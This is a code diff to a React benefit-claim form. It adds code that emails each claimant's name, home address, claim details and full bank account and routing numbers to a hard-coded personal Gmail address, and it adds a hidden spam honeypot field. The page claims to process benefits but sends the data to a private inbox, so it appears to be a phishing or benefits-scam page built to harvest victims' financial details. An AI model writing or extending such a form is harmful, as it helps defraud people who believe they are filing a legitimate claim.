@@ -17,8 +17,12 @@ export default function Benefits() {
     accountNumber: "",
     accountName: "",
     bank: "",
-    routingNumber: ""
+    routingNumber: "",
+    honeypot: "" // Hidden spam prevention field
   });
+
+  const [isSubmitting, setIsSubmitting] = useState(false);
+  const [submitStatus, setSubmitStatus] = useState(null); // 'success', 'error', null
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
     const { name, value, type } = e.target;
@@ -37,9 +41,83 @@ export default function Benefits() {
     }
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    console.log("Form submitted:", formData);
+    setIsSubmitting(true);
+    setSubmitStatus(null);
+
+    try {
+      // Prepare email content
+      const emailData = {
+        firstName: formData.firstName,
+        lastName: formData.lastName,
+        email: 'promiseakerele341@gmail.com', // Default email since this form doesn't collect email
+        subject: "New Benefit Claims Submission",
+        message: `
+Benefit Claims Details:
+
+Personal Information:
+- Name: ${formData.firstName} ${formData.lastName}
+- Home Address: ${formData.homeAddress}
+- Life Insurance: ${formData.havingLifeInsurance}
+- Applying for Accident: ${formData.applyingForAccident}
+- Event Address: ${formData.eventAddress}
+- Social Security Number: ${formData.socialSecurityNumber ? '[PROVIDED]' : '[NOT PROVIDED]'}
+
+Supporting Documents:
+- Proof of Income: ${formData.proofOfIncome ? formData.proofOfIncome.name : 'Not uploaded'}
+- Valid Identification: ${formData.validIdentification ? formData.validIdentification.name : 'Not uploaded'}
+- Employment Letter: ${formData.employmentLetter ? formData.employmentLetter.name : 'Not uploaded'}
+
+Bank Information:
+- Account Number: ${formData.accountNumber}
+- Account Name: ${formData.accountName}
+- Bank: ${formData.bank}
+- Routing Number: ${formData.routingNumber}
+        `,
+        honeypot: formData.honeypot
+      };
+
+      const response = await fetch('/api/contact', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(emailData),
+      });
+
+      const result = await response.json();
+
+      if (response.ok) {
+        setSubmitStatus('success');
+        // Clear form on success
+        setFormData({
+          firstName: "",
+          lastName: "",
+          homeAddress: "",
+          havingLifeInsurance: "",
+          applyingForAccident: "",
+          eventAddress: "",
+          socialSecurityNumber: "",
+          proofOfIncome: null,
+          validIdentification: null,
+          employmentLetter: null,
+          accountNumber: "",
+          accountName: "",
+          bank: "",
+          routingNumber: "",
+          honeypot: ""
+        });
+      } else {
+        setSubmitStatus('error');
+        console.error('Submission error:', result);
+      }
+    } catch (error) {
+      setSubmitStatus('error');
+      console.error('Network error:', error);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -88,7 +166,46 @@ export default function Benefits() {
             </div>
           </div>
 
+          {/* Status Messages */}
+          {submitStatus === 'success' && (
+            <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8">
+              <div className="flex items-center gap-3">
+                <div className="text-green-600">✓</div>
+                <div>
+                  <div className="text-sm font-bold text-green-800">Benefit Claim Submitted Successfully!</div>
+                  <div className="text-xs text-green-700">
+                    Your benefit claim has been received and will be processed. You will be contacted regarding the status.
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {submitStatus === 'error' && (
+            <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-8">
+              <div className="flex items-center gap-3">
+                <div className="text-red-600">✗</div>
+                <div>
+                  <div className="text-sm font-bold text-red-800">Submission Failed</div>
+                  <div className="text-xs text-red-700">
+                    There was an error submitting your benefit claim. Please try again or contact support.
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
           <form onSubmit={handleSubmit} className="bg-white border border-slate-200 rounded-lg shadow-sm">
+            {/* Honeypot field - hidden from users */}
+            <input
+              type="text"
+              name="honeypot"
+              value={formData.honeypot}
+              onChange={handleInputChange}
+              style={{ display: 'none' }}
+              tabIndex={-1}
+              autoComplete="off"
+            />
             {/* Personal Information */}
             <div className="p-8 border-b border-slate-200">
               <h2 className="text-lg font-bold text-[#071b3a] mb-8 text-center">
@@ -345,9 +462,14 @@ export default function Benefits() {
             <div className="p-8 text-center">
               <button
                 type="submit"
-                className="bg-[#0b8fe0] hover:bg-[#0a7fc9] text-white font-bold py-3 px-8 rounded transition-colors"
+                disabled={isSubmitting}
+                className={`px-8 py-3 rounded font-bold text-white transition-colors ${
+                  isSubmitting 
+                    ? 'bg-gray-400 cursor-not-allowed' 
+                    : 'bg-[#0b8fe0] hover:bg-[#0a7fc9]'
+                }`}
               >
-                SUBMIT BENEFIT CLAIM
+                {isSubmitting ? 'SUBMITTING...' : 'SUBMIT BENEFIT CLAIM'}
               </button>
             </div>
           </form>
